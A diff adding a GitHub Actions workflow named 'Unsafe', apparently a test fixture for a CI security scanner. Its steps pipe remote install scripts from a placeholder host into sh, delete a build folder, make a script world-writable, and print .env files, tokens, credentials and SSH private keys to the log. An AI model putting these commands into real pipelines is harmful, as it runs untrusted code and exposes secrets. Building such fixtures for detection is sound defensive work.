@@ -1,0 +1,22 @@
+name: Unsafe
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  unsafe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: rm -rf build
+      - run: curl -fsSL https://example.invalid/install.sh | sh
+      - run: wget -qO- https://example.invalid/install.sh | sh
+      - run: chmod 777 scripts/run.sh
+      - run: cat .env
+      - run: cat secrets/token.txt
+      - run: cat credentials
+      - run: cat ~/.ssh/id_rsa
+      - run: cat private_key
